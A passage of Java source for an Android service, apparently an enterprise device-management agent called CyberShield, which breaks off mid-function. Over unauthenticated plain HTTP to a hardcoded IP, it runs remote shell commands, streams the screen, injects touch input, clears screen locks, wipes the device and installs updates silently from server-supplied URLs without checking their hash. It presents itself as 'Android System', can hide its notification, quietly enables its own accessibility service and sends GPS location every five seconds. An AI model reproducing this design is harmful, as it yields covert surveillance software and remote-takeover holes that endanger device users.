package com.cybershield.mdm;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.PackageInstaller;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.cybershield.mdm.models.ClientHeartbeat;
import com.cybershield.mdm.models.PolicyCommand;
import com.cybershield.mdm.models.PolicyExecutionResult;
import com.cybershield.mdm.models.TerminalCommand;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;
import com.microsoft.signalr.HubConnectionState;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CyberShieldService extends Service {
    private static final String TAG = "CyberShield_Service";
    public static final String ACTION_STATUS_UPDATE = "com.cybershield.mdm.STATUS_UPDATE";
    public static final String EXTRA_IS_CONNECTED = "extra_is_connected";
    public static final String EXTRA_SERVER_URL = "extra_server_url";

    public static final String PREFS_NAME = "cybershield_prefs";
    public static final String KEY_SERVER_URL = "server_url";
    public static final String KEY_LOCAL_SERVER_URL = "local_server_url";

    // Primary Server Endpoint (Public Dedicated Server IP)
    public static final String PUBLIC_SERVER_URL = "http://14.194.19.6:5000/hubs/endpoints";
    public static final String DEFAULT_SERVER_URL = PUBLIC_SERVER_URL;

    // Discreet system notification channel
    public static final String CHANNEL_ID = "android_system_sync_channel_v2";
    public static final String KEY_HIDE_SYNC_NOTIFICATION = "hide_sync_notification";
    public static final String KEY_USB_BLOCKED = "usb_blocked";
    public static final String KEY_SOFTWARE_BLOCKED = "software_blocked";
    public static final String KEY_WEB_FILTER_BLOCKED = "web_filter_blocked";
    public static final String KEY_WEB_FILTER_PAYLOAD = "web_filter_payload";
    public static final String KEY_SAMSUNG_ACCOUNT_BLOCKED = "samsung_account_blocked";
    public static final String KEY_GPS_FORCED_ON = "gps_forced_on";
    private static final int NOTIFICATION_ID = 1001;

    private int currentUrlIndex = 0;
    private String currentActiveUrl = PUBLIC_SERVER_URL;

    private PolicyEngine policyEngine;
    private RemoteGatewayManager remoteGatewayManager;
    private HubConnection hubConnection;
    private ScheduledExecutorService heartbeatScheduler;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Gson gson = new Gson();

    private boolean isUsbStorageBlocked = false;
    private boolean isSoftwareInstallBlocked = false;
    private boolean isWebFilteringBlocked = false;
    private boolean isSamsungAccountBlocked = false;
    private boolean isSyncNotificationHidden = false;
    private boolean permissionsAutoGranted = false;
    private String cachedHardwareId = null;

    public static void startService(Context context) {
        Intent intent = new Intent(context, CyberShieldService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();

        // 0. Crash-Guard: Ignore transient SignalR transport cleanup exceptions, handle others gracefully
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            if (throwable != null && throwable.getMessage() != null && throwable.getMessage().contains("Transport.stop")) {
                Log.w(TAG, "Ignored transient SignalR transport stop exception during reconnection.");
                return;
            }
            Log.e(TAG, "Uncaught exception in " + thread.getName() + ": " + throwable.getMessage(), throwable);
        });

        policyEngine = new PolicyEngine(this);
        remoteGatewayManager = new RemoteGatewayManager(this);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        isSyncNotificationHidden = prefs.getBoolean(KEY_HIDE_SYNC_NOTIFICATION, false);
        isUsbStorageBlocked = prefs.getBoolean(KEY_USB_BLOCKED, false);
        isSoftwareInstallBlocked = prefs.getBoolean(KEY_SOFTWARE_BLOCKED, false);
        isWebFilteringBlocked = prefs.getBoolean(KEY_WEB_FILTER_BLOCKED, false);
        isSamsungAccountBlocked = prefs.getBoolean(KEY_SAMSUNG_ACCOUNT_BLOCKED, false);

        if (isWebFilteringBlocked) {
            String savedWebPayload = prefs.getString(KEY_WEB_FILTER_PAYLOAD, "");
            applyWebFilteringPayload(savedWebPayload, true);
        }

        createNotificationChannel();
        startInForeground();

        // Auto-grant essential Device Owner permissions silently (IMEI, Location, Notifications)
        autoGrantEnterprisePermissions();

        // Load optimal candidate URL (Local LAN URL first when on Wi-Fi)
        List<String> candidates = getCandidateUrls();
        currentActiveUrl = candidates.isEmpty() ? PUBLIC_SERVER_URL : candidates.get(0);

        // 1. Trigger UDP Auto-Discovery in background to find local server on Wi-Fi immediately
        runUdpDiscovery();

        // 2. Initialize SignalR Connection
        initSignalR();
    }

    private void autoGrantEnterprisePermissions() {
        if (permissionsAutoGranted) return;
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MdmDeviceAdminReceiver.class);
            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
                String[] perms = new String[] {
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                };
                for (String perm : perms) {
                    try {
                        if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                            dpm.setPermissionGrantState(admin, getPackageName(), perm,
                                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                        }
                    } catch (Exception ignored) {}
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    try {
                        int grantState = isSyncNotificationHidden ?
                                DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED :
                                DevicePolicyManager.PERMISSION_GRANT_STATE_DEFAULT;
                        dpm.setPermissionGrantState(admin, getPackageName(), "android.permission.POST_NOTIFICATIONS", grantState);
                    } catch (Exception ignored) {}
                }
                ensureAccessibilityServiceEnabled();
                permissionsAutoGranted = true;
                Log.i(TAG, "Enterprise Device Owner permissions silently validated.");
            }
        } catch (Exception ignored) {}
    }

    public void ensureAccessibilityServiceEnabled() {
        try {
            if (MdmAccessibilityService.isRunning()) {
                return;
            }
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            String targetService = getPackageName() + "/" + MdmAccessibilityService.class.getName();
            if (enabled == null || !enabled.contains(targetService)) {
                String updated = (enabled == null || enabled.trim().isEmpty()) ? targetService : enabled + ":" + targetService;
                Settings.Secure.putString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated);
                Settings.Secure.putInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 1);
                Log.i(TAG, "Auto-enabled MdmAccessibilityService via Settings.Secure!");
            }
        } catch (Exception e) {
            Log.d(TAG, "Settings.Secure auto-enable note: " + e.getMessage());
        }
    }

    private void runUdpDiscovery() {
        UdpDiscoveryClient.discoverServerAsync(this, discoveredUrl -> {
            Log.i(TAG, "Auto-discovered local server URL on Wi-Fi: " + discoveredUrl);
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit().putString(KEY_LOCAL_SERVER_URL, discoveredUrl).apply();
            if (!discoveredUrl.equals(currentActiveUrl)) {
                currentActiveUrl = discoveredUrl;
                mainHandler.post(() -> {
                    if (hubConnection != null && hubConnection.getConnectionState() == HubConnectionState.CONNECTED) {
                        try { hubConnection.stop().blockingAwait(); } catch (Exception ignored) {}
                        hubConnection = null;
                    }
                    initSignalR();
                });
            }
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                try {
                    manager.deleteNotificationChannel("android_system_sync_channel");
                } catch (Exception ignored) {}

                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "Device Health & Security Sync",
                        NotificationManager.IMPORTANCE_MIN
                );
                channel.setDescription("Background system sync and policy enforcement.");
                channel.setShowBadge(false);
                channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    channel.setBlockable(true);
                }
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void startInForeground() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System")
                .setContentText("Device security & sync active")
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (Exception e) {
            Log.w(TAG, "startForeground with type failed: " + e.getMessage() + ", falling back to standard");
            try {
                startForeground(NOTIFICATION_ID, notification);
            } catch (Exception ex) {
                Log.e(TAG, "Standard startForeground also failed: " + ex.getMessage(), ex);
            }
        }

        if (isSyncNotificationHidden) {
            try {
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) {
                    manager.cancel(NOTIFICATION_ID);
                }
            } catch (Exception ignored) {}
        }
    }

    private void showItAlertNotification(String msg) {
        try {
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager == null) return;
            String alertChannelId = "cybershield_it_alerts";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(
                        alertChannelId,
                        "IT Admin Alerts",
                        NotificationManager.IMPORTANCE_HIGH
                );
                ch.setDescription("Important corporate IT announcements and alerts");
                manager.createNotificationChannel(ch);
            }
            Notification alertNotif = new NotificationCompat.Builder(this, alertChannelId)
                    .setContentTitle("IT Admin Notice")
                    .setContentText(msg)
                    .setStyle(new NotificationCompat.BigTextStyle().bigText(msg))
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setAutoCancel(true)
                    .build();
            manager.notify((int) (System.currentTimeMillis() % 100000), alertNotif);
        } catch (Exception ignored) {}
    }

    private void updateNotification(boolean isConnected) {
        if (isSyncNotificationHidden) {
            try {
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) {
                    manager.cancel(NOTIFICATION_ID);
                }
            } catch (Exception ignored) {}
            return;
        }

        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            String statusDesc = isConnected ? "Device security sync active" : "Sync reconnecting...";

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Android System")
                    .setContentText(statusDesc)
                    .setSmallIcon(android.R.drawable.stat_sys_warning)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .build();

            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        } catch (Exception ignored) {}
    }

    private String getServerUrl() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
    }

    private void saveServerUrl(String url) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putString(KEY_SERVER_URL, url).apply();
    }

    private List<String> getCandidateUrls() {
        List<String> list = new ArrayList<>();
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String localUrl = prefs.getString(KEY_LOCAL_SERVER_URL, "").trim();
        String publicUrl = prefs.getString(KEY_SERVER_URL, PUBLIC_SERVER_URL).trim();

        boolean isWifi = isConnectedToOfficeWifi();
        if (isWifi) {
            if (!localUrl.isEmpty() && !list.contains(localUrl)) list.add(localUrl);
            if (!publicUrl.isEmpty() && !list.contains(publicUrl)) list.add(publicUrl);
        } else {
            if (!publicUrl.isEmpty() && !list.contains(publicUrl)) list.add(publicUrl);
            if (!localUrl.isEmpty() && !list.contains(localUrl)) list.add(localUrl);
        }

        if (list.isEmpty()) {
            list.add(PUBLIC_SERVER_URL);
        }
        return list;
    }

    private synchronized void initSignalR() {
        List<String> candidates = getCandidateUrls();
        if (!candidates.contains(currentActiveUrl)) {
            currentActiveUrl = candidates.get(0);
        }
        Log.i(TAG, "Initializing SignalR connection to: " + currentActiveUrl);

        try {
            if (hubConnection != null) {
                try { hubConnection.stop().blockingAwait(); } catch (Exception ignored) {}
            }

            setupHubConnection(currentActiveUrl);

            // Connect in background thread
            Executors.newSingleThreadExecutor().execute(() -> {
                boolean connected = tryConnectCurrentHub();
                if (!connected) {
                    tryAlternateUrl();
                }
            });

            startHeartbeatScheduler();

        } catch (Exception e) {
            Log.e(TAG, "Error configuring SignalR: " + e.getMessage(), e);
        }
    }

    private void setupHubConnection(String url) {
        hubConnection = HubConnectionBuilder.create(url).build();

        // 1. Policy Dispatch from Server
        hubConnection.on("ExecutePolicy", (commandJson) -> {
            Log.i(TAG, "Received ExecutePolicy from server: " + commandJson);
            handlePolicyCommand(commandJson);
        }, Object.class);

        // 2. Remote Shell Terminal Execution
        hubConnection.on("ExecuteTerminalCommand", (cmdObj) -> {
            try {
                TerminalCommand cmd;
                if (cmdObj instanceof String) {
                    cmd = gson.fromJson((String) cmdObj, TerminalCommand.class);
                } else {
                    String json = gson.toJson(cmdObj);
                    cmd = gson.fromJson(json, TerminalCommand.class);
                }
                Log.i(TAG, "Received ExecuteTerminalCommand: " + (cmd != null ? cmd.commandText : "null"));
                remoteGatewayManager.executeCommand(cmd, hubConnection);
            } catch (Exception e) {
                Log.e(TAG, "Terminal command error: " + e.getMessage());
            }
        }, Object.class);

        // 3. Remote Screen / Live Stream Start
        hubConnection.on("StartScreenStream", (adminId) -> {
            Log.i(TAG, "Received StartScreenStream request from Admin: " + adminId);
            ensureAccessibilityServiceEnabled();
            remoteGatewayManager.startScreenStream((String) adminId, hubConnection);
        }, String.class);

        // 4. Remote Screen Stream Stop
        hubConnection.on("StopScreenStream", () -> {
            Log.i(TAG, "Received StopScreenStream request.");
            remoteGatewayManager.stopScreenStream();
        });

        // 5. Remote Input (Touch, Gestures, Key Shortcuts from Admin Console)
        hubConnection.on("ProcessRemoteInput", (inputObj) -> {
            try {
                remoteGatewayManager.handleRemoteInput(inputObj);
            } catch (Exception e) {
                Log.w(TAG, "Error handling remote input: " + e.getMessage());
            }
        }, Object.class);

        // 6. Silent Remote Auto-Update (OTA) via Device Owner PackageInstaller
        hubConnection.on("ExecuteClientUpdate", (downloadUrl, targetVer, sha256) -> {
            Log.i(TAG, "Received ExecuteClientUpdate signal: " + downloadUrl + " (v" + targetVer + ")");
            new Thread(() -> performSilentOtaUpdate(String.valueOf(downloadUrl))).start();
        }, String.class, String.class, String.class);

        hubConnection.onClosed(exception -> {
            Log.w(TAG, "SignalR Connection closed: " + (exception != null ? exception.getMessage() : "None"));
            broadcastStatus(false);
        });
    }

    private boolean tryConnectCurrentHub() {
        try {
            hubConnection.start().blockingAwait();
            Log.i(TAG, "SignalR connection established successfully to: " + currentActiveUrl);
            broadcastStatus(true);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Failed connecting to " + currentActiveUrl + ": " + e.getMessage());
            broadcastStatus(false);
            return false;
        }
    }

    private synchronized void tryAlternateUrl() {
        List<String> candidates = getCandidateUrls();
        if (candidates.isEmpty()) return;

        currentUrlIndex = (currentUrlIndex + 1) % candidates.size();
        currentActiveUrl = candidates.get(currentUrlIndex);
        Log.i(TAG, "Attempting connection to alternate URL (" + (currentUrlIndex + 1) + "/" + candidates.size() + "): " + currentActiveUrl);

        // If Wi-Fi is active and disconnected, also trigger UDP discovery
        if (isConnectedToOfficeWifi()) {
            runUdpDiscovery();
        }

        try {
            if (hubConnection != null) {
                try { hubConnection.stop().blockingAwait(); } catch (Exception ignored) {}
            }
            setupHubConnection(currentActiveUrl);
            boolean success = tryConnectCurrentHub();
            if (success) {
                Log.i(TAG, "Successfully connected to alternate URL: " + currentActiveUrl);
            }
        } catch (Exception e) {
            Log.e(TAG, "Alternate connection failed: " + e.getMessage());
            broadcastStatus(false);
        }
    }

    private void handlePolicyCommand(Object commandObj) {
        try {
            PolicyCommand cmd;
            if (commandObj instanceof String) {
                cmd = gson.fromJson((String) commandObj, PolicyCommand.class);
            } else {
                String json = gson.toJson(commandObj);
                cmd = gson.fromJson(json, PolicyCommand.class);
            }

            if (cmd == null) return;

            boolean success = false;
            String message = "";

            switch (cmd.policy) {
                case 10: // LockWorkstation -> Lock Mobile Screen
                    success = policyEngine.lockScreen();
                    message = success ? "Mobile device screen locked." : "Failed to lock screen (Device Admin required).";
                    break;

                case 1: // UsbStorageBlock -> Restrict USB File Transfer (MTP/PTP)
                    isUsbStorageBlocked = cmd.enableRestriction;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(KEY_USB_BLOCKED, isUsbStorageBlocked).apply();
                    success = policyEngine.setUsbDataTransferBlocked(cmd.enableRestriction);
                    message = "USB Data Transfer restriction set to: " + cmd.enableRestriction;
                    break;

                case 2: // DisableSoftwareInstallation -> Block App & APK Installations
                    isSoftwareInstallBlocked = cmd.enableRestriction;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(KEY_SOFTWARE_BLOCKED, isSoftwareInstallBlocked).apply();
                    success = policyEngine.setSoftwareInstallBlocked(cmd.enableRestriction);
                    message = "App / Software installation restriction set to: " + cmd.enableRestriction;
                    break;

                case 3: // RestrictExternalFileTransfer or Camera Toggle
                    success = policyEngine.setCameraDisabled(cmd.enableRestriction);
                    message = "Hardware camera disabled status: " + cmd.enableRestriction;
                    break;

                case 4: // WebFilteringBlock -> Sync On-Device DNS Blacklist
                    isWebFilteringBlocked = cmd.enableRestriction;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                            .putBoolean(KEY_WEB_FILTER_BLOCKED, isWebFilteringBlocked)
                            .putString(KEY_WEB_FILTER_PAYLOAD, cmd.payload != null ? cmd.payload : "")
                            .apply();
                    success = applyWebFilteringPayload(cmd.payload, cmd.enableRestriction);
                    message = "DNS Web Filtering policy updated. Restriction: " + cmd.enableRestriction;
                    break;

                case 11: // RestartLaptop / Reboot Mobile
                    Log.i(TAG, "Received remote Reboot command for mobile device.");
                    success = policyEngine.rebootDevice();
                    message = success ? "Device reboot initiated." : "Reboot failed. Device Owner permission required.";
                    break;

                case 12: // SendNotification
                    String alertMsg = cmd.payload != null ? cmd.payload : "Corporate IT Compliance Notice";
                    mainHandler.post(() -> {
                        try {
                            Intent alertIntent = new Intent(getApplicationContext(), ItAlertActivity.class);
                            alertIntent.putExtra(ItAlertActivity.EXTRA_MESSAGE, alertMsg);
                            alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            startActivity(alertIntent);
                        } catch (Exception ex) {
                            Log.w(TAG, "ItAlertActivity launch fallback to Toast: " + ex.getMessage());
                        }
                        Toast.makeText(getApplicationContext(), "IT Admin Alert: " + alertMsg, Toast.LENGTH_LONG).show();
                    });
                    showItAlertNotification(alertMsg);
                    success = true;
                    message = "IT Alert popup displayed on screen.";
                    break;

                case 15: // ClearScreenLock / Remote Password Reset (Samsung Care Bypass)
                    Log.i(TAG, "Received remote Screen Lock Reset/Clear command! Payload: " + cmd.payload);
                    String newPass = (cmd.payload != null && !cmd.payload.trim().isEmpty() && !cmd.payload.equalsIgnoreCase("CLEAR")) ? cmd.payload.trim() : null;
                    success = policyEngine.resetOrClearPassword(newPass);
                    message = success ? (newPass == null ? "Screen lock PIN/password cleared successfully. Phone unlocked." : "Screen lock PIN updated.") 
                                      : "Failed to reset screen lock. Ensure Device Owner mode is active.";
                    break;

                case 16: // BlockSamsungAccount
                    boolean blockSamsung = cmd.enableRestriction;
                    isSamsungAccountBlocked = blockSamsung;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(KEY_SAMSUNG_ACCOUNT_BLOCKED, blockSamsung).apply();
                    success = policyEngine.setSamsungAccountBlocked(blockSamsung);
                    message = "Samsung Account sign-in restriction set to: " + blockSamsung;
                    break;

                case 17: // BlockAccountModification
                    boolean blockAccounts = cmd.enableRestriction;
                    success = policyEngine.setAccountModificationBlocked(blockAccounts);
                    message = "Account modification restriction set to: " + blockAccounts;
                    break;

                case 18: // PlayLostAlarm / Siren (Option 5)
                    boolean playAlarm = cmd.enableRestriction && (cmd.payload == null || !cmd.payload.equalsIgnoreCase("STOP"));
                    if (playAlarm) {
                        success = policyEngine.playLostPhoneAlarm();
                        message = success ? "Emergency lost phone siren started at max volume." : "Failed to trigger emergency siren.";
                    } else {
                        success = policyEngine.stopLostPhoneAlarm();
                        message = "Emergency siren stopped.";
                    }
                    break;

                case 19: // ForceGpsAlwaysOn (Option 6)
                    boolean forceGps = cmd.enableRestriction;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(KEY_GPS_FORCED_ON, forceGps).apply();
                    success = policyEngine.setLocationAlwaysOn(forceGps);
                    message = "Forced GPS location always ON policy: " + forceGps;
                    break;

                case 21: // HideSyncNotification
                    boolean hideNotif = cmd.enableRestriction;
                    isSyncNotificationHidden = hideNotif;
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                            .edit()
                            .putBoolean(KEY_HIDE_SYNC_NOTIFICATION, hideNotif)
                            .apply();
                    success = policyEngine.setSyncNotificationHidden(hideNotif);
                    if (hideNotif) {
                        try {
                            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                            if (nm != null) nm.cancel(NOTIFICATION_ID);
                        } catch (Exception ignored) {}
                    } else {
                        updateNotification(hubConnection != null && hubConnection.getConnectionState() == HubConnectionState.CONNECTED);
                    }
                    message = "Persistent sync notification visibility set: hidden=" + hideNotif;
                    break;

                case 99: // Remote Wipe / Format
                    Log.w(TAG, "Received Authorized Remote Wipe command! Payload: " + cmd.payload);
                    success = policyEngine.wipeDevice();
                    message = success ? "Remote factory wipe initiated successfully." : "Factory wipe failed. Device Owner permission required.";
                    break;

                default:
                    // Check payload text for specific commands
                    if (cmd.payload != null && cmd.payload.contains("CLEAR_LOCK")) {
                        success = policyEngine.resetOrClearPassword(null);
                        message = success ? "Screen lock removed successfully." : "Failed to remove screen lock.";
                    } else if (cmd.payload != null && cmd.payload.contains("BLOCK_SAMSUNG")) {
                        boolean block = cmd.payload.contains("ENABLE") || cmd.payload.contains("TRUE");
                        success = policyEngine.setSamsungAccountBlocked(block);
                        message = "Samsung Account blocked: " + block;
                    } else if (cmd.payload != null && cmd.payload.contains("CAMERA")) {
                        boolean disable = cmd.payload.contains("DISABLE") || cmd.payload.contains("BLOCK");
                        success = policyEngine.setCameraDisabled(disable);
                        message = "Camera policy applied: " + disable;
                    } else if (cmd.payload != null && cmd.payload.contains("FORMAT_LOCK")) {
                        boolean blockFormat = cmd.payload.contains("ENABLE") || cmd.payload.contains("TRUE");
                        success = policyEngine.setFactoryResetBlocked(blockFormat);
                        message = "Factory reset format lock set to: " + blockFormat;
                    } else {
                        message = "Command " + cmd.policy + " acknowledged by Android agent.";
                        success = true;
                    }
                    break;
            }

            // Report execution result back to Server
            if (hubConnection != null && hubConnection.getConnectionState() == HubConnectionState.CONNECTED) {
                PolicyExecutionResult result = new PolicyExecutionResult(cmd.commandId, success, message);
                hubConnection.send("ReportExecutionResult", result);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error handling policy command: " + e.getMessage(), e);
        }
    }

    private boolean applyWebFilteringPayload(String payload, boolean enable) {
        try {
            if (!enable) {
                policyEngine.setBrowserWebFiltering(Collections.emptyList(), Collections.emptyList(), false);
                policyEngine.setAlwaysOnVpn(false);
                MdmVpnFilterService.stopFilter(this);
                return true;
            }

            List<String> blocked = new ArrayList<>();
            List<String> allowed = new ArrayList<>();

            if (payload != null && !payload.trim().isEmpty()) {
                if (payload.startsWith("{")) {
                    JsonObject obj = JsonParser.parseString(payload).getAsJsonObject();
                    if (obj.has("Blocked") && obj.get("Blocked").isJsonArray()) {
                        for (var item : obj.getAsJsonArray("Blocked")) {
                            blocked.add(item.getAsString());
                        }
                    }
                    if (obj.has("Allowed") && obj.get("Allowed").isJsonArray()) {
                        for (var item : obj.getAsJsonArray("Allowed")) {
                            allowed.add(item.getAsString());
                        }
                    }
                } else {
                    blocked.addAll(Arrays.asList(payload.split(",")));
                }
            }

            // 1. Enforce browser URLBlocklist natively in Chrome & Samsung Internet
            policyEngine.setBrowserWebFiltering(blocked, allowed, true);

            // 2. Grant & configure VPN via Device Owner silently (lockdown = false)
            policyEngine.setAlwaysOnVpn(true);
            MdmVpnFilterService.updatePolicies(blocked, allowed);
            MdmVpnFilterService.startFilter(this);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to apply web filtering payload: " + e.getMessage());
            return false;
        }
    }

    private void startHeartbeatScheduler() {
        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
            heartbeatScheduler.shutdownNow();
        }

        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
        heartbeatScheduler.scheduleWithFixedDelay(this::sendHeartbeatTick, 1, 5, TimeUnit.SECONDS);
    }

    private void sendHeartbeatTick() {
        if (hubConnection == null || hubConnection.getConnectionState() != HubConnectionState.CONNECTED) {
            broadcastStatus(false);
            try {
                if (hubConnection != null) {
                    hubConnection.start().blockingAwait();
                    broadcastStatus(true);
                }
            } catch (Exception ignored) {
                // If current URL fails, try alternating between Local LAN and Public IP
                tryAlternateUrl();
                return;
            }
        }

        try {
            ClientHeartbeat hb = createHeartbeat();
            hubConnection.send("SendHeartbeat", hb);
            broadcastStatus(true);
        } catch (Exception e) {
            Log.w(TAG, "Error sending heartbeat: " + e.getMessage());
            broadcastStatus(false);
            tryAlternateUrl();
        }
    }

    private ClientHeartbeat createHeartbeat() {
        ClientHeartbeat hb = new ClientHeartbeat();
        hb.machineName = (Build.MANUFACTURER + "-" + Build.MODEL).toUpperCase().replaceAll("\\s+", "-");
        hb.hardwareId = getDeviceHardwareId();
        hb.userName = "Android Mobile (" + Build.BRAND + ")";
        hb.osVersion = "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
        try {
            String ver = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
            hb.clientVersion = (ver != null && !ver.isEmpty()) ? ver : "1.3.0";
        } catch (Exception ignored) {
            hb.clientVersion = "1.3.0";
        }
        hb.ipAddress = getDeviceIpAddress();
        hb.externalFileTransferRestricted = policyEngine.isCameraDisabled();
        hb.usbStorageBlocked = isUsbStorageBlocked;
        hb.softwareInstallDisabled = isSoftwareInstallBlocked;
        hb.webFilteringBlocked = isWebFilteringBlocked;
        hb.selectivePrintRestricted = isSamsungAccountBlocked;
        hb.syncNotificationHidden = isSyncNotificationHidden;

        // Location reading
        Location loc = getLastKnownLocation();
        if (loc != null) {
            hb.latitude = loc.getLatitude();
            hb.longitude = loc.getLongitude();
        }

        // Detect if connected to office Wi-Fi
        hb.networkLocation = isConnectedToOfficeWifi() ? "In Office" : "Work From Home";

        return hb;
    }

    private boolean isConnectedToOfficeWifi() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                var network = cm.getActiveNetwork();
                if (network != null) {
                    var caps = cm.getNetworkCapabilities(network);
                    if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                        String ip = getDeviceIpAddress();
                        if (ip != null && (ip.startsWith("192.168.68.") || ip.startsWith("192.168.69.") ||
                                           ip.startsWith("192.168.70.") || ip.startsWith("192.168.71."))) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @SuppressLint("MissingPermission")
    private Location getLastKnownLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                Location net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (gps != null && net != null) {
                    return gps.getTime() > net.getTime() ? gps : net;
                }
                return gps != null ? gps : net;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private String getDeviceIpAddress() {
        try {
